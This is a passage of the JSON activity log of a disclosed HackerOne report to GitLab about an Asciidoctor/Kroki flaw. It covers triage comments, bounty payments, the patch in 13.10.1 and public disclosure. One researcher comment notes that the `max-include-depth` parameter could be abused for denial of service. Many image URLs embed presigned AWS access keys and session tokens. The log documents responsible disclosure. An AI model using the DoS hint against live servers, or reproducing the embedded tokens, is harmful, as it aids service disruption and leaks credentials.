.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVJI3TZP5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132431Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJHMEUCIDDOenL7uY4or83Q1QkoD3xFl3uQkVICTxz%2FSDsIuWn2AiEA6%2FBWebe5fWUS9x04VtqSrFyJrrJX9Wzed2z5QiFgezgqgwQI7f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDH%2Fcd6CfZMtsGgbHGSrXAymgqTqfvaCT83Vkk5pwapbWccEe%2BTtGThweNvSHf8FWkbmUnw2%2BMW8gqDcDNfGz7tEqv52qONc53GYs0r8D4W05T9cQ0uJtgIqBt4OmGkISCOluU2WykgPIXNEjqYkmh5zHooyqwoU4aWAvfbkbpMVL9O0nweFS83%2BqHqg3OXHtztd3WIO7FAtaIQ%2BDUZpyi%2B0a6zYS63Ic2i25q%2F413QAdfE21IQe9RLjfzNve6b8NLPdujPpkD5MvBg8opZAcnhH3rst0f02RrXBCwMAlbK6eiAdI%2FzxadkB6vJ9FtNU65o45iqF45d%2BYmfZJlOFMAVeS2pbeBJdGI7Fl7Z2hiMv0eHtvGwtxj3crYZJWjN69sMxNPs09KcOtApNPAFwGOGCcmDvm1areMVntxdnNYOlBWv0Aq3wyIXZsHHz8lX9tMjmv61dmZYvcByrfDvKW9exhQBN91h%2F%2BbxVbw80KEhIU5ipL2I5om6%2B6BoUggVA6Zd8rRJTc%2Fnn4LxgieuXFRKE4YsS3SCif0QZM6U80f0hPAJ0yiZeJUwXPDeGE0VCDJ5xmoacd5KWtjrjLbalrb5cz74c83ZZVOwv00icAbZKCzCMp4PLt5n7snHsnET8g6Tc7A6HNeDDY0ZCLBjqlARSrOasljqaSB8W9wmwFFWOUexc%2FyrrCODPiZEQKPd3A4ujWW2tnvxuhmbVhX2LLKdYUWL%2BqV7PXCjSBr8z9e13VbLgHltUO2EekXZyt0zUO0YHMr%2B%2B3y2ykh6QETPea4u6xBc1fOLSy9BKwigrMcXLVPZQgcLcQ07YofmFon1WVZYXr3Y0Iu6F%2Fi5W2fPKhu6dNiq1Z9eaTAlzThXI9e%2BPtktaqIg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=890cbfbcd9cfe585df5c5b17e1928bd27ac9b38246e8ba94e77f319614c7ceeb"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10634780,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also i dont think this is limited to kroki, this could also change the number of includes asciidoc leading to potential DoS by this param `max-include-depth`","automated_response":false,"created_at":"2021-02-10T13:33:12.610Z","updated_at":"2021-02-10T13:33:12.610Z","actor":{"username":"ledz1996","cleared":true,"url":"/ledz1996","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/584/872/78b4b2fa1173d85b7f043e9c6fc027af5699cdfc_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10645150,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the details. I will add it tot the issue.\n\nCostel","automated_response":false,"created_at":"2021-02-11T13:34:37.723Z","updated_at":"2021-02-11T13:34:37.723Z","actor":{"username":"gitlab_cmaxim","cleared":false,"url":"/gitlab_cmaxim","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/vmc7q2peqzpyt965jezuwkm4ravx/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22cyber.png%22%3B%20filename%2A%3DUTF-8%27%27cyber.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVJI3TZP5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132431Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJHMEUCIDDOenL7uY4or83Q1QkoD3xFl3uQkVICTxz%2FSDsIuWn2AiEA6%2FBWebe5fWUS9x04VtqSrFyJrrJX9Wzed2z5QiFgezgqgwQI7f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDH%2Fcd6CfZMtsGgbHGSrXAymgqTqfvaCT83Vkk5pwapbWccEe%2BTtGThweNvSHf8FWkbmUnw2%2BMW8gqDcDNfGz7tEqv52qONc53GYs0r8D4W05T9cQ0uJtgIqBt4OmGkISCOluU2WykgPIXNEjqYkmh5zHooyqwoU4aWAvfbkbpMVL9O0nweFS83%2BqHqg3OXHtztd3WIO7FAtaIQ%2BDUZpyi%2B0a6zYS63Ic2i25q%2F413QAdfE21IQe9RLjfzNve6b8NLPdujPpkD5MvBg8opZAcnhH3rst0f02RrXBCwMAlbK6eiAdI%2FzxadkB6vJ9FtNU65o45iqF45d%2BYmfZJlOFMAVeS2pbeBJdGI7Fl7Z2hiMv0eHtvGwtxj3crYZJWjN69sMxNPs09KcOtApNPAFwGOGCcmDvm1areMVntxdnNYOlBWv0Aq3wyIXZsHHz8lX9tMjmv61dmZYvcByrfDvKW9exhQBN91h%2F%2BbxVbw80KEhIU5ipL2I5om6%2B6BoUggVA6Zd8rRJTc%2Fnn4LxgieuXFRKE4YsS3SCif0QZM6U80f0hPAJ0yiZeJUwXPDeGE0VCDJ5xmoacd5KWtjrjLbalrb5cz74c83ZZVOwv00icAbZKCzCMp4PLt5n7snHsnET8g6Tc7A6HNeDDY0ZCLBjqlARSrOasljqaSB8W9wmwFFWOUexc%2FyrrCODPiZEQKPd3A4ujWW2tnvxuhmbVhX2LLKdYUWL%2BqV7PXCjSBr8z9e13VbLgHltUO2EekXZyt0zUO0YHMr%2B%2B3y2ykh6QETPea4u6xBc1fOLSy9BKwigrMcXLVPZQgcLcQ07YofmFon1WVZYXr3Y0Iu6F%2Fi5W2fPKhu6dNiq1Z9eaTAlzThXI9e%2BPtktaqIg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=890cbfbcd9cfe585df5c5b17e1928bd27ac9b38246e8ba94e77f319614c7ceeb"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10645159,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hello @ledz1996,\n\nThank you for submitting this report.\n\nWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab/-/issues/320919.  This issue will be made public 30 days following the release of a patch.\n\nGiven the severity of the report, we are paying an initial $500 on triage. Congratulations!\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nCostel\nGitLab Security Team","automated_response":false,"created_at":"2021-02-11T13:36:08.088Z","updated_at":"2021-02-11T13:36:08.088Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"GitLab"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"ledz1996","url":"/ledz1996"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10645634,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @gitlab_cmaxim, thank you, sorry if its sensitive, but nomarlly, its 1k$ per high/crit triage, may i ask why this is lower :D, i'm not demanding but just curioslly asking.","automated_response":false,"created_at":"2021-02-11T13:55:26.521Z","updated_at":"2021-02-11T13:55:26.521Z","actor":{"username":"ledz1996","cleared":true,"url":"/ledz1996","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/584/872/78b4b2fa1173d85b7f043e9c6fc027af5699cdfc_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10708751,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @ledz1996, \n\nApologise for the delayed response. Just a small update on this report:  We have contacted asciidoctor about this issue and they are working on patch for this. You can find more details here: https://github.com/asciidoctor/asciidoctor/issues/3939.\n\nRegards,\nCostel","automated_response":false,"created_at":"2021-02-18T11:57:10.695Z","updated_at":"2021-02-18T11:57:10.695Z","actor":{"username":"gitlab_cmaxim","cleared":false,"url":"/gitlab_cmaxim","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/vmc7q2peqzpyt965jezuwkm4ravx/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22cyber.png%22%3B%20filename%2A%3DUTF-8%27%27cyber.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVJI3TZP5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132431Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJHMEUCIDDOenL7uY4or83Q1QkoD3xFl3uQkVICTxz%2FSDsIuWn2AiEA6%2FBWebe5fWUS9x04VtqSrFyJrrJX9Wzed2z5QiFgezgqgwQI7f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDH%2Fcd6CfZMtsGgbHGSrXAymgqTqfvaCT83Vkk5pwapbWccEe%2BTtGThweNvSHf8FWkbmUnw2%2BMW8gqDcDNfGz7tEqv52qONc53GYs0r8D4W05T9cQ0uJtgIqBt4OmGkISCOluU2WykgPIXNEjqYkmh5zHooyqwoU4aWAvfbkbpMVL9O0nweFS83%2BqHqg3OXHtztd3WIO7FAtaIQ%2BDUZpyi%2B0a6zYS63Ic2i25q%2F413QAdfE21IQe9RLjfzNve6b8NLPdujPpkD5MvBg8opZAcnhH3rst0f02RrXBCwMAlbK6eiAdI%2FzxadkB6vJ9FtNU65o45iqF45d%2BYmfZJlOFMAVeS2pbeBJdGI7Fl7Z2hiMv0eHtvGwtxj3crYZJWjN69sMxNPs09KcOtApNPAFwGOGCcmDvm1areMVntxdnNYOlBWv0Aq3wyIXZsHHz8lX9tMjmv61dmZYvcByrfDvKW9exhQBN91h%2F%2BbxVbw80KEhIU5ipL2I5om6%2B6BoUggVA6Zd8rRJTc%2Fnn4LxgieuXFRKE4YsS3SCif0QZM6U80f0hPAJ0yiZeJUwXPDeGE0VCDJ5xmoacd5KWtjrjLbalrb5cz74c83ZZVOwv00icAbZKCzCMp4PLt5n7snHsnET8g6Tc7A6HNeDDY0ZCLBjqlARSrOasljqaSB8W9wmwFFWOUexc%2FyrrCODPiZEQKPd3A4ujWW2tnvxuhmbVhX2LLKdYUWL%2BqV7PXCjSBr8z9e13VbLgHltUO2EekXZyt0zUO0YHMr%2B%2B3y2ykh6QETPea4u6xBc1fOLSy9BKwigrMcXLVPZQgcLcQ07YofmFon1WVZYXr3Y0Iu6F%2Fi5W2fPKhu6dNiq1Z9eaTAlzThXI9e%2BPtktaqIg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=890cbfbcd9cfe585df5c5b17e1928bd27ac9b38246e8ba94e77f319614c7ceeb"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10749083,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ETA for fix:\n\nHi @ledz1996,\n\nThe issue you reported is currently scheduled to be fixed by 2021-03-31.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n","automated_response":true,"created_at":"2021-02-23T04:19:35.211Z","updated_at":"2021-02-23T04:19:35.211Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":11212899,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hello @ledz1996,\n\nThank you again for the report! Your finding has been patched in GitLab version 13.10.1. Congratulations!\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.\n\nWe look forward to your next report!\n\nBest regards,\nCostel\nGitLab Security Team","automated_response":false,"created_at":"2021-04-01T16:12:27.610Z","updated_at":"2021-04-01T16:12:27.610Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"GitLab"}},"bounty_amount":"2300.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"ledz1996","url":"/ledz1996"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11212907,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Patched in GitLab version 13.10.1.\n\nCostel","automated_response":false,"created_at":"2021-04-01T16:13:07.999Z","updated_at":"2021-04-01T16:13:07.999Z","actor":{"username":"gitlab_cmaxim","cleared":false,"url":"/gitlab_cmaxim","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/vmc7q2peqzpyt965jezuwkm4ravx/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22cyber.png%22%3B%20filename%2A%3DUTF-8%27%27cyber.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVJI3TZP5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132431Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJHMEUCIDDOenL7uY4or83Q1QkoD3xFl3uQkVICTxz%2FSDsIuWn2AiEA6%2FBWebe5fWUS9x04VtqSrFyJrrJX9Wzed2z5QiFgezgqgwQI7f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDH%2Fcd6CfZMtsGgbHGSrXAymgqTqfvaCT83Vkk5pwapbWccEe%2BTtGThweNvSHf8FWkbmUnw2%2BMW8gqDcDNfGz7tEqv52qONc53GYs0r8D4W05T9cQ0uJtgIqBt4OmGkISCOluU2WykgPIXNEjqYkmh5zHooyqwoU4aWAvfbkbpMVL9O0nweFS83%2BqHqg3OXHtztd3WIO7FAtaIQ%2BDUZpyi%2B0a6zYS63Ic2i25q%2F413QAdfE21IQe9RLjfzNve6b8NLPdujPpkD5MvBg8opZAcnhH3rst0f02RrXBCwMAlbK6eiAdI%2FzxadkB6vJ9FtNU65o45iqF45d%2BYmfZJlOFMAVeS2pbeBJdGI7Fl7Z2hiMv0eHtvGwtxj3crYZJWjN69sMxNPs09KcOtApNPAFwGOGCcmDvm1areMVntxdnNYOlBWv0Aq3wyIXZsHHz8lX9tMjmv61dmZYvcByrfDvKW9exhQBN91h%2F%2BbxVbw80KEhIU5ipL2I5om6%2B6BoUggVA6Zd8rRJTc%2Fnn4LxgieuXFRKE4YsS3SCif0QZM6U80f0hPAJ0yiZeJUwXPDeGE0VCDJ5xmoacd5KWtjrjLbalrb5cz74c83ZZVOwv00icAbZKCzCMp4PLt5n7snHsnET8g6Tc7A6HNeDDY0ZCLBjqlARSrOasljqaSB8W9wmwFFWOUexc%2FyrrCODPiZEQKPd3A4ujWW2tnvxuhmbVhX2LLKdYUWL%2BqV7PXCjSBr8z9e13VbLgHltUO2EekXZyt0zUO0YHMr%2B%2B3y2ykh6QETPea4u6xBc1fOLSy9BKwigrMcXLVPZQgcLcQ07YofmFon1WVZYXr3Y0Iu6F%2Fi5W2fPKhu6dNiq1Z9eaTAlzThXI9e%2BPtktaqIg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=890cbfbcd9cfe585df5c5b17e1928bd27ac9b38246e8ba94e77f319614c7ceeb"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"ledz1996","url":"/ledz1996"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11701941,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @ledz1996,\n\nWe are rolling back our policy of awarding 50% bounty for vulnerabilities found in third-party dependencies (a policy update will follow soon) and are retroactively awarding the rest of the bounty for this report.\n\nBest regards,\nDominic\nGitLab Security Team","automated_response":false,"created_at":"2021-05-11T14:16:15.679Z","updated_at":"2021-05-11T14:16:15.679Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"GitLab"}},"bounty_amount":"2800.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"ledz1996","url":"/ledz1996"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11841856,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-05-21T19:51:33.674Z","updated_at":"2021-05-21T19:51:33.674Z","first_to_agree":true,"actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11841889,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @dcouture, been out of context for awhile ;), let disclose this, thank you for the notification.","automated_response":false,"created_at":"2021-05-21T19:55:32.744Z","updated_at":"2021-05-21T19:55:32.744Z","actor":{"username":"ledz1996","cleared":true,"url":"/ledz1996","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/584/872/78b4b2fa1173d85b7f043e9c6fc027af5699cdfc_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11841894,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also, thanks for the bounty ~","automated_response":false,"created_at":"2021-05-21T19:55:53.178Z","updated_at":"2021-05-21T19:55:53.178Z","actor":{"username":"ledz1996","cleared":true,"url":"/ledz1996","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/584/872/78b4b2fa1173d85b7f043e9c6fc027af5699cdfc_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11841897,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-05-21T19:56:02.549Z","updated_at":"2021-05-21T19:56:02.549Z","actor":{"username":"ledz1996","cleared":true,"url":"/ledz1996","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/584/872/78b4b2fa1173d85b7f043e9c6fc027af5699cdfc_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11841898,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-05-21T19:56:02.623Z","updated_at":"2021-05-21T19:56:02.623Z","actor":{"username":"ledz1996","cleared":true,"url":"/ledz1996","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/584/872/78b4b2fa1173d85b7f043e9c6fc027af5699cdfc_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}